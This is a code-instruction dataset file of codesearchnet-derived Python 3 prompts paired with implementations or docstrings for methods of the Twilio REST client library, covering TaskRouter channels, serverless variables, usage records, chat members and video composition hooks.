{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\ncreating a new TaskChannelInstance", "response": "def create(self, friendly_name, unique_name):\n        \"\"\"\n        Create a new TaskChannelInstance\n\n        :param unicode friendly_name: String representing user-friendly name for the TaskChannel\n        :param unicode unique_name: String representing unique name for the TaskChannel\n\n        :returns: Newly created TaskChannelInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_channel.TaskChannelInstance\n        \"\"\"\n        data = values.of({'FriendlyName': friendly_name, 'UniqueName': unique_name, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return TaskChannelInstance(self._version, payload, workspace_sid=self._solution['workspace_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\nconstructs a TaskChannelContext :param sid: The sid :returns: twilio.rest.taskrouter.v1.workspace.task_channel.TaskChannelContext :rtype: twilio.rest.taskrouter.v1.workspace.task_channel.TaskChannelContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a TaskChannelContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.taskrouter.v1.workspace.task_channel.TaskChannelContext\n        :rtype: twilio.rest.taskrouter.v1.workspace.task_channel.TaskChannelContext\n        \"\"\"\n        return TaskChannelContext(self._version, workspace_sid=self._solution['workspace_sid'], sid=sid, )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get_instance(self, payload):\n        return TaskChannelInstance(self._version, payload, workspace_sid=self._solution['workspace_sid'], )", "response": "Build an instance of TaskChannelInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef _proxy(self):\n        if self._context is None:\n            self._context = TaskChannelContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n                sid=self._solution['sid'],\n            )\n        return self._context", "response": "Generate an instance context for the resource we are interested in"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function that can\ncreate a new VariableInstance", "response": "def create(self, key, value):\n        \"\"\"\n        Create a new VariableInstance\n\n        :param unicode key: The key\n        :param unicode value: The value\n\n        :returns: Newly created VariableInstance\n        :rtype: twilio.rest.serverless.v1.service.environment.variable.VariableInstance\n        \"\"\"\n        data = values.of({'Key': key, 'Value': value, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return VariableInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            environment_sid=self._solution['environment_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef get(self, sid):\n        return VariableContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            environment_sid=self._solution['environment_sid'],\n            sid=sid,\n        )", "response": "Constructs a VariableContext\n\n        :param sid: The sid\n\n        :returns: twilio.rest.serverless.v1.service.environment.variable.VariableContext\n        :rtype: twilio.rest.serverless.v1.service.environment.variable.VariableContext"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef get_instance(self, payload):\n        return VariableInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            environment_sid=self._solution['environment_sid'],\n        )", "response": "Build an instance of VariableInstance"}
{"SOURCE": "codesearchnet", "instruction": "Can you implement a function in Python 3 that\nfetches a VariableInstance :returns: Fetched VariableInstance :rtype: twilio.rest.serverless.v1.service.environment.variable.VariableInstance", "response": "def fetch(self):\n        \"\"\"\n        Fetch a VariableInstance\n\n        :returns: Fetched VariableInstance\n        :rtype: twilio.rest.serverless.v1.service.environment.variable.VariableInstance\n        \"\"\"\n        params = values.of({})\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return VariableInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            environment_sid=self._solution['environment_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\nupdate the VariableInstance :param unicode key: The key :param unicode value: The value :returns: Updated VariableInstance :rtype: twilio.rest.serverless.v1.service.environment.variable.VariableInstance", "response": "def update(self, key=values.unset, value=values.unset):\n        \"\"\"\n        Update the VariableInstance\n\n        :param unicode key: The key\n        :param unicode value: The value\n\n        :returns: Updated VariableInstance\n        :rtype: twilio.rest.serverless.v1.service.environment.variable.VariableInstance\n        \"\"\"\n        data = values.of({'Key': key, 'Value': value, })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return VariableInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            environment_sid=self._solution['environment_sid'],\n            sid=self._solution['sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nupdates the VariableInstance :param unicode key: The key :param unicode value: The value :returns: Updated VariableInstance :rtype: twilio.rest.serverless.v1.service.environment.variable.VariableInstance", "response": "def update(self, key=values.unset, value=values.unset):\n        \"\"\"\n        Update the VariableInstance\n\n        :param unicode key: The key\n        :param unicode value: The value\n\n        :returns: Updated VariableInstance\n        :rtype: twilio.rest.serverless.v1.service.environment.variable.VariableInstance\n        \"\"\"\n        return self._proxy.update(key=key, value=value, )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef sessions(self):\n        if self._sessions is None:\n            self._sessions = SessionList(self)\n        return self._sessions", "response": "Access the SessionList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\naccessing the Services Twilio Domain", "response": "def services(self):\n        \"\"\"\n        :rtype: twilio.rest.messaging.v1.service.ServiceList\n        \"\"\"\n        if self._services is None:\n            self._services = ServiceList(self)\n        return self._services"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef webhooks(self):\n        if self._webhooks is None:\n            self._webhooks = WebhookList(self)\n        return self._webhooks", "response": "Access the WebhookList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nstream RecordInstance records from the API as a list.", "response": "def list(self, category=values.unset, start_date=values.unset,\n             end_date=values.unset, include_subaccounts=values.unset, limit=None,\n             page_size=None):\n        \"\"\"\n        Lists RecordInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param RecordInstance.Category category: The usage category of the UsageRecord resources to read\n        :param date start_date: Only include usage that has occurred on or after this date\n        :param date end_date: Only include usage that occurred on or before this date\n        :param bool include_subaccounts: Whether to include usage from the master account and all its subaccounts\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.api.v2010.account.usage.record.RecordInstance]\n        \"\"\"\n        return list(self.stream(\n            category=category,\n            start_date=start_date,\n            end_date=end_date,\n            include_subaccounts=include_subaccounts,\n            limit=limit,\n            page_size=page_size,\n        ))"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\naccessing the all_time :returns: twilio.rest.api.v2010.account.usage.record.all_time.AllTimeList :rtype: twilio.rest.api.v2010.account.usage.record.all_time.AllTimeList", "response": "def all_time(self):\n        \"\"\"\n        Access the all_time\n\n        :returns: twilio.rest.api.v2010.account.usage.record.all_time.AllTimeList\n        :rtype: twilio.rest.api.v2010.account.usage.record.all_time.AllTimeList\n        \"\"\"\n        if self._all_time is None:\n            self._all_time = AllTimeList(self._version, account_sid=self._solution['account_sid'], )\n        return self._all_time"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef daily(self):\n        if self._daily is None:\n            self._daily = DailyList(self._version, account_sid=self._solution['account_sid'], )\n        return self._daily", "response": "Access the daily\n\n        :returns: twilio.rest.api.v2010.account.usage.record.daily.DailyList\n        :rtype: twilio.rest.api.v2010.account.usage.record.daily.DailyList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\naccessing the last_month :returns: twilio.rest.api.v2010.account.usage.record.last_month.LastMonthList :rtype: twilio.rest.api.v2010.account.usage.record.last_month.LastMonthList", "response": "def last_month(self):\n        \"\"\"\n        Access the last_month\n\n        :returns: twilio.rest.api.v2010.account.usage.record.last_month.LastMonthList\n        :rtype: twilio.rest.api.v2010.account.usage.record.last_month.LastMonthList\n        \"\"\"\n        if self._last_month is None:\n            self._last_month = LastMonthList(self._version, account_sid=self._solution['account_sid'], )\n        return self._last_month"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\naccess the monthly :returns: twilio.rest.api.v2010.account.usage.record.monthly.MonthlyList :rtype: twilio.rest.api.v2010.account.usage.record.monthly.MonthlyList", "response": "def monthly(self):\n        \"\"\"\n        Access the monthly\n\n        :returns: twilio.rest.api.v2010.account.usage.record.monthly.MonthlyList\n        :rtype: twilio.rest.api.v2010.account.usage.record.monthly.MonthlyList\n        \"\"\"\n        if self._monthly is None:\n            self._monthly = MonthlyList(self._version, account_sid=self._solution['account_sid'], )\n        return self._monthly"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef this_month(self):\n        if self._this_month is None:\n            self._this_month = ThisMonthList(self._version, account_sid=self._solution['account_sid'], )\n        return self._this_month", "response": "Access the this_month\n\n        :returns: twilio.rest.api.v2010.account.usage.record.this_month.ThisMonthList\n        :rtype: twilio.rest.api.v2010.account.usage.record.this_month.ThisMonthList"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef today(self):\n        if self._today is None:\n            self._today = TodayList(self._version, account_sid=self._solution['account_sid'], )\n        return self._today", "response": "Access the today\n\n        :returns: twilio.rest.api.v2010.account.usage.record.today.TodayList\n        :rtype: twilio.rest.api.v2010.account.usage.record.today.TodayList"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script for\naccessing the yearly :returns: twilio.rest.api.v2010.account.usage.record.yearly.YearlyList :rtype: twilio.rest.api.v2010.account.usage.record.yearly.YearlyList", "response": "def yearly(self):\n        \"\"\"\n        Access the yearly\n\n        :returns: twilio.rest.api.v2010.account.usage.record.yearly.YearlyList\n        :rtype: twilio.rest.api.v2010.account.usage.record.yearly.YearlyList\n        \"\"\"\n        if self._yearly is None:\n            self._yearly = YearlyList(self._version, account_sid=self._solution['account_sid'], )\n        return self._yearly"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate the documentation for the following Python 3 function\ndef yesterday(self):\n        if self._yesterday is None:\n            self._yesterday = YesterdayList(self._version, account_sid=self._solution['account_sid'], )\n        return self._yesterday", "response": "Access the yesterday\n\n        :returns: twilio.rest.api.v2010.account.usage.record.yesterday.YesterdayList\n        :rtype: twilio.rest.api.v2010.account.usage.record.yesterday.YesterdayList"}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nbuilds an instance of RecordInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of RecordInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.usage.record.RecordInstance\n        :rtype: twilio.rest.api.v2010.account.usage.record.RecordInstance\n        \"\"\"\n        return RecordInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Make a summary of the following Python 3 code\ndef credentials(self):\n        if self._credentials is None:\n            self._credentials = CredentialList(self)\n        return self._credentials", "response": "Access the CredentialList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 script to\ncreate a new BulkCountryUpdateInstance", "response": "def create(self, update_request):\n        \"\"\"\n        Create a new BulkCountryUpdateInstance\n\n        :param unicode update_request: URL encoded JSON array of update objects\n\n        :returns: Newly created BulkCountryUpdateInstance\n        :rtype: twilio.rest.voice.v1.dialing_permissions.bulk_country_update.BulkCountryUpdateInstance\n        \"\"\"\n        data = values.of({'UpdateRequest': update_request, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return BulkCountryUpdateInstance(self._version, payload, )"}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return WorkersCumulativeStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n        )", "response": "Build an instance of WorkersCumulativeStatisticsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef fetch(self, end_date=values.unset, minutes=values.unset,\n              start_date=values.unset, task_channel=values.unset):\n        \"\"\"\n        Fetch a WorkersCumulativeStatisticsInstance\n\n        :param datetime end_date: Filter cumulative statistics by a end date.\n        :param unicode minutes: Filter cumulative statistics by up to 'x' minutes in the past.\n        :param datetime start_date: Filter cumulative statistics by a start date.\n        :param unicode task_channel: Filter cumulative statistics by TaskChannel.\n\n        :returns: Fetched WorkersCumulativeStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_cumulative_statistics.WorkersCumulativeStatisticsInstance\n        \"\"\"\n        params = values.of({\n            'EndDate': serialize.iso8601_datetime(end_date),\n            'Minutes': minutes,\n            'StartDate': serialize.iso8601_datetime(start_date),\n            'TaskChannel': task_channel,\n        })\n\n        payload = self._version.fetch(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return WorkersCumulativeStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n        )", "response": "Fetch a WorkersCumulativeStatisticsInstance\n\n        :param datetime end_date: Filter cumulative statistics by a end date.\n        :param unicode minutes: Filter cumulative statistics by up to 'x' minutes in the past.\n        :param datetime start_date: Filter cumulative statistics by a start date.\n        :param unicode task_channel: Filter cumulative statistics by TaskChannel.\n\n        :returns: Fetched WorkersCumulativeStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_cumulative_statistics.WorkersCumulativeStatisticsInstance"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\ngenerate an instance context for the availabe a WorkersCumulativeStatisticsInstance", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: WorkersCumulativeStatisticsContext for this WorkersCumulativeStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.worker.workers_cumulative_statistics.WorkersCumulativeStatisticsContext\n        \"\"\"\n        if self._context is None:\n            self._context = WorkersCumulativeStatisticsContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef list(self, identity=values.unset, limit=None, page_size=None):\n        return list(self.stream(identity=identity, limit=limit, page_size=page_size, ))", "response": "Streams the MemberInstance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Can you write a function in Python 3 where it\nconstructs a MemberContext :param sid: The unique string that identifies the resource :returns: twilio.rest.chat.v2.service.channel.member.MemberContext :rtype: twilio.rest.chat.v2.service.channel.member.MemberContext", "response": "def get(self, sid):\n        \"\"\"\n        Constructs a MemberContext\n\n        :param sid: The unique string that identifies the resource\n\n        :returns: twilio.rest.chat.v2.service.channel.member.MemberContext\n        :rtype: twilio.rest.chat.v2.service.channel.member.MemberContext\n        \"\"\"\n        return MemberContext(\n            self._version,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n            sid=sid,\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Implement a function in Python 3 to\nbuild an instance of MemberInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of MemberInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.chat.v2.service.channel.member.MemberInstance\n        :rtype: twilio.rest.chat.v2.service.channel.member.MemberInstance\n        \"\"\"\n        return MemberInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n        )"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef update(self, role_sid=values.unset,\n               last_consumed_message_index=values.unset,\n               last_consumption_timestamp=values.unset, date_created=values.unset,\n               date_updated=values.unset, attributes=values.unset):\n        \"\"\"\n        Update the MemberInstance\n\n        :param unicode role_sid: The SID of the Role to assign to the member\n        :param unicode last_consumed_message_index: The index of the last consumed Message for the Channel for the Member\n        :param datetime last_consumption_timestamp: The ISO 8601 based timestamp string representing the date-time of the last Message read event for the Member within the Channel\n        :param datetime date_created: The ISO 8601 date and time in GMT when the resource was created\n        :param datetime date_updated: The ISO 8601 date and time in GMT when the resource was updated\n        :param unicode attributes: A valid JSON string that contains application-specific data\n\n        :returns: Updated MemberInstance\n        :rtype: twilio.rest.chat.v2.service.channel.member.MemberInstance\n        \"\"\"\n        data = values.of({\n            'RoleSid': role_sid,\n            'LastConsumedMessageIndex': last_consumed_message_index,\n            'LastConsumptionTimestamp': serialize.iso8601_datetime(last_consumption_timestamp),\n            'DateCreated': serialize.iso8601_datetime(date_created),\n            'DateUpdated': serialize.iso8601_datetime(date_updated),\n            'Attributes': attributes,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return MemberInstance(\n            self._version,\n            payload,\n            service_sid=self._solution['service_sid'],\n            channel_sid=self._solution['channel_sid'],\n            sid=self._solution['sid'],\n        )", "response": "Update the MemberInstance\n\n        :param unicode role_sid: The SID of the Role to assign to the member\n        :param unicode last_consumed_message_index: The index of the last consumed Message for the Channel for the Member\n        :param datetime last_consumption_timestamp: The ISO 8601 based timestamp string representing the date-time of the last Message read event for the Member within the Channel\n        :param datetime date_created: The ISO 8601 date and time in GMT when the resource was created\n        :param datetime date_updated: The ISO 8601 date and time in GMT when the resource was updated\n        :param unicode attributes: A valid JSON string that contains application-specific data\n\n        :returns: Updated MemberInstance\n        :rtype: twilio.rest.chat.v2.service.channel.member.MemberInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update(self, role_sid=values.unset,\n               last_consumed_message_index=values.unset,\n               last_consumption_timestamp=values.unset, date_created=values.unset,\n               date_updated=values.unset, attributes=values.unset):\n        \"\"\"\n        Update the MemberInstance\n\n        :param unicode role_sid: The SID of the Role to assign to the member\n        :param unicode last_consumed_message_index: The index of the last consumed Message for the Channel for the Member\n        :param datetime last_consumption_timestamp: The ISO 8601 based timestamp string representing the date-time of the last Message read event for the Member within the Channel\n        :param datetime date_created: The ISO 8601 date and time in GMT when the resource was created\n        :param datetime date_updated: The ISO 8601 date and time in GMT when the resource was updated\n        :param unicode attributes: A valid JSON string that contains application-specific data\n\n        :returns: Updated MemberInstance\n        :rtype: twilio.rest.chat.v2.service.channel.member.MemberInstance\n        \"\"\"\n        return self._proxy.update(\n            role_sid=role_sid,\n            last_consumed_message_index=last_consumed_message_index,\n            last_consumption_timestamp=last_consumption_timestamp,\n            date_created=date_created,\n            date_updated=date_updated,\n            attributes=attributes,\n        )", "response": "Update the MemberInstance s properties"}
{"SOURCE": "codesearchnet", "instruction": "Here you have a function in Python 3, explain what it does\ndef fleets(self):\n        if self._fleets is None:\n            self._fleets = FleetList(self)\n        return self._fleets", "response": "Access the FleetList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef get_instance(self, payload):\n        return WorkspaceRealTimeStatisticsInstance(\n            self._version,\n            payload,\n            workspace_sid=self._solution['workspace_sid'],\n        )", "response": "Build an instance of WorkspaceRealTimeStatisticsInstance"}
{"SOURCE": "codesearchnet", "instruction": "How would you implement a function in Python 3 that\ngenerates an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: WorkspaceRealTimeStatisticsContext for this WorkspaceRealTimeStatisticsInstance\n        :rtype: twilio.rest.taskrouter.v1.workspace.workspace_real_time_statistics.WorkspaceRealTimeStatisticsContext\n        \"\"\"\n        if self._context is None:\n            self._context = WorkspaceRealTimeStatisticsContext(\n                self._version,\n                workspace_sid=self._solution['workspace_sid'],\n            )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef fetch(self, task_channel=values.unset):\n        return self._proxy.fetch(task_channel=task_channel, )", "response": "Fetch a WorkspaceRealTimeStatisticsInstance by task channel."}
{"SOURCE": "codesearchnet", "instruction": "Can you tell what is the following Python 3 function doing\ndef get_instance(self, payload):\n        return UsageRecordInstance(self._version, payload, sim_sid=self._solution['sim_sid'], )", "response": "Build an instance of UsageRecordInstance"}
{"SOURCE": "codesearchnet", "instruction": "Given the following Python 3 function, write the documentation\ndef list(self, enabled=values.unset, date_created_after=values.unset,\n             date_created_before=values.unset, friendly_name=values.unset,\n             limit=None, page_size=None):\n        \"\"\"\n        Lists CompositionHookInstance records from the API as a list.\n        Unlike stream(), this operation is eager and will load `limit` records into\n        memory before returning.\n\n        :param bool enabled: Only show Composition Hooks enabled or disabled.\n        :param datetime date_created_after: Only show Composition Hooks created on or after this ISO8601 date-time with timezone.\n        :param datetime date_created_before: Only show Composition Hooks created before this ISO8601 date-time with timezone.\n        :param unicode friendly_name: Only show Composition Hooks with friendly name that match this name.\n        :param int limit: Upper limit for the number of records to return. list() guarantees\n                          never to return more than limit.  Default is no limit\n        :param int page_size: Number of records to fetch per request, when not set will use\n                              the default value of 50 records.  If no page_size is defined\n                              but a limit is defined, list() will attempt to read the limit\n                              with the most efficient page size, i.e. min(limit, 1000)\n\n        :returns: Generator that will yield up to limit results\n        :rtype: list[twilio.rest.video.v1.composition_hook.CompositionHookInstance]\n        \"\"\"\n        return list(self.stream(\n            enabled=enabled,\n            date_created_after=date_created_after,\n            date_created_before=date_created_before,\n            friendly_name=friendly_name,\n            limit=limit,\n            page_size=page_size,\n        ))", "response": "Streams Composition Hook Instance records from the API as a list."}
{"SOURCE": "codesearchnet", "instruction": "Implement a Python 3 function for\nretrieving a single page of CompositionHookInstance records from the API. Request is executed immediately", "response": "def page(self, enabled=values.unset, date_created_after=values.unset,\n             date_created_before=values.unset, friendly_name=values.unset,\n             page_token=values.unset, page_number=values.unset,\n             page_size=values.unset):\n        \"\"\"\n        Retrieve a single page of CompositionHookInstance records from the API.\n        Request is executed immediately\n\n        :param bool enabled: Only show Composition Hooks enabled or disabled.\n        :param datetime date_created_after: Only show Composition Hooks created on or after this ISO8601 date-time with timezone.\n        :param datetime date_created_before: Only show Composition Hooks created before this ISO8601 date-time with timezone.\n        :param unicode friendly_name: Only show Composition Hooks with friendly name that match this name.\n        :param str page_token: PageToken provided by the API\n        :param int page_number: Page Number, this value is simply for client state\n        :param int page_size: Number of records to return, defaults to 50\n\n        :returns: Page of CompositionHookInstance\n        :rtype: twilio.rest.video.v1.composition_hook.CompositionHookPage\n        \"\"\"\n        params = values.of({\n            'Enabled': enabled,\n            'DateCreatedAfter': serialize.iso8601_datetime(date_created_after),\n            'DateCreatedBefore': serialize.iso8601_datetime(date_created_before),\n            'FriendlyName': friendly_name,\n            'PageToken': page_token,\n            'Page': page_number,\n            'PageSize': page_size,\n        })\n\n        response = self._version.page(\n            'GET',\n            self._uri,\n            params=params,\n        )\n\n        return CompositionHookPage(self._version, response, self._solution)"}
{"SOURCE": "codesearchnet", "instruction": "Explain what the following Python 3 code does\ndef update(self, friendly_name, enabled=values.unset, video_layout=values.unset,\n               audio_sources=values.unset, audio_sources_excluded=values.unset,\n               trim=values.unset, format=values.unset, resolution=values.unset,\n               status_callback=values.unset, status_callback_method=values.unset):\n        \"\"\"\n        Update the CompositionHookInstance\n\n        :param unicode friendly_name: Friendly name of the Composition Hook to be shown in the console.\n        :param bool enabled: Boolean flag indicating if the Composition Hook is active.\n        :param dict video_layout: The JSON video layout description.\n        :param unicode audio_sources: A list of audio sources related to this Composition Hook.\n        :param unicode audio_sources_excluded: A list of audio sources excluded related to this Composition Hook.\n        :param bool trim: Boolean flag for clipping intervals that have no media.\n        :param CompositionHookInstance.Format format: Container format of the Composition Hook media file. Any of the following: `mp4`, `webm`.\n        :param unicode resolution: Pixel resolution of the composed video.\n        :param unicode status_callback: A URL that Twilio sends asynchronous webhook requests to on every composition event.\n        :param unicode status_callback_method: HTTP method Twilio should use when requesting the above URL.\n\n        :returns: Updated CompositionHookInstance\n        :rtype: twilio.rest.video.v1.composition_hook.CompositionHookInstance\n        \"\"\"\n        data = values.of({\n            'FriendlyName': friendly_name,\n            'Enabled': enabled,\n            'VideoLayout': serialize.object(video_layout),\n            'AudioSources': serialize.map(audio_sources, lambda e: e),\n            'AudioSourcesExcluded': serialize.map(audio_sources_excluded, lambda e: e),\n            'Trim': trim,\n            'Format': format,\n            'Resolution': resolution,\n            'StatusCallback': status_callback,\n            'StatusCallbackMethod': status_callback_method,\n        })\n\n        payload = self._version.update(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return CompositionHookInstance(self._version, payload, sid=self._solution['sid'], )", "response": "Update the Composition Hook Instance"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ngenerating an instance context for the object", "response": "def _proxy(self):\n        \"\"\"\n        Generate an instance context for the instance, the context is capable of\n        performing various actions.  All instance actions are proxied to the context\n\n        :returns: CompositionHookContext for this CompositionHookInstance\n        :rtype: twilio.rest.video.v1.composition_hook.CompositionHookContext\n        \"\"\"\n        if self._context is None:\n            self._context = CompositionHookContext(self._version, sid=self._solution['sid'], )\n        return self._context"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef update(self, friendly_name, enabled=values.unset, video_layout=values.unset,\n               audio_sources=values.unset, audio_sources_excluded=values.unset,\n               trim=values.unset, format=values.unset, resolution=values.unset,\n               status_callback=values.unset, status_callback_method=values.unset):\n        \"\"\"\n        Update the CompositionHookInstance\n\n        :param unicode friendly_name: Friendly name of the Composition Hook to be shown in the console.\n        :param bool enabled: Boolean flag indicating if the Composition Hook is active.\n        :param dict video_layout: The JSON video layout description.\n        :param unicode audio_sources: A list of audio sources related to this Composition Hook.\n        :param unicode audio_sources_excluded: A list of audio sources excluded related to this Composition Hook.\n        :param bool trim: Boolean flag for clipping intervals that have no media.\n        :param CompositionHookInstance.Format format: Container format of the Composition Hook media file. Any of the following: `mp4`, `webm`.\n        :param unicode resolution: Pixel resolution of the composed video.\n        :param unicode status_callback: A URL that Twilio sends asynchronous webhook requests to on every composition event.\n        :param unicode status_callback_method: HTTP method Twilio should use when requesting the above URL.\n\n        :returns: Updated CompositionHookInstance\n        :rtype: twilio.rest.video.v1.composition_hook.CompositionHookInstance\n        \"\"\"\n        return self._proxy.update(\n            friendly_name,\n            enabled=enabled,\n            video_layout=video_layout,\n            audio_sources=audio_sources,\n            audio_sources_excluded=audio_sources_excluded,\n            trim=trim,\n            format=format,\n            resolution=resolution,\n            status_callback=status_callback,\n            status_callback_method=status_callback_method,\n        )", "response": "Update the Composition Hook Instance"}
{"SOURCE": "codesearchnet", "instruction": "How would you explain what the following Python 3 function does\ndef create(self, ttl=values.unset):\n        data = values.of({'Ttl': ttl, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return TokenInstance(self._version, payload, account_sid=self._solution['account_sid'], )", "response": "Create a new TokenInstance"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function for\nbuilding an instance of TokenInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of TokenInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.api.v2010.account.token.TokenInstance\n        :rtype: twilio.rest.api.v2010.account.token.TokenInstance\n        \"\"\"\n        return TokenInstance(self._version, payload, account_sid=self._solution['account_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Can you generate a brief explanation for the following Python 3 code\ndef phone_numbers(self):\n        if self._phone_numbers is None:\n            self._phone_numbers = PhoneNumberList(self)\n        return self._phone_numbers", "response": "Access the PhoneNumberList Twilio Domain"}
{"SOURCE": "codesearchnet", "instruction": "Write a Python 3 function for\ncreating a new VerificationCheckInstance", "response": "def create(self, code, to=values.unset):\n        \"\"\"\n        Create a new VerificationCheckInstance\n\n        :param unicode code: The verification string\n        :param unicode to: To phonenumber\n\n        :returns: Newly created VerificationCheckInstance\n        :rtype: twilio.rest.preview.acc_security.service.verification_check.VerificationCheckInstance\n        \"\"\"\n        data = values.of({'Code': code, 'To': to, })\n\n        payload = self._version.create(\n            'POST',\n            self._uri,\n            data=data,\n        )\n\n        return VerificationCheckInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
{"SOURCE": "codesearchnet", "instruction": "Create a Python 3 function to\nbuild an instance of VerificationCheckInstance", "response": "def get_instance(self, payload):\n        \"\"\"\n        Build an instance of VerificationCheckInstance\n\n        :param dict payload: Payload response from the API\n\n        :returns: twilio.rest.preview.acc_security.service.verification_check.VerificationCheckInstance\n        :rtype: twilio.rest.preview.acc_security.service.verification_check.VerificationCheckInstance\n        \"\"\"\n        return VerificationCheckInstance(self._version, payload, service_sid=self._solution['service_sid'], )"}
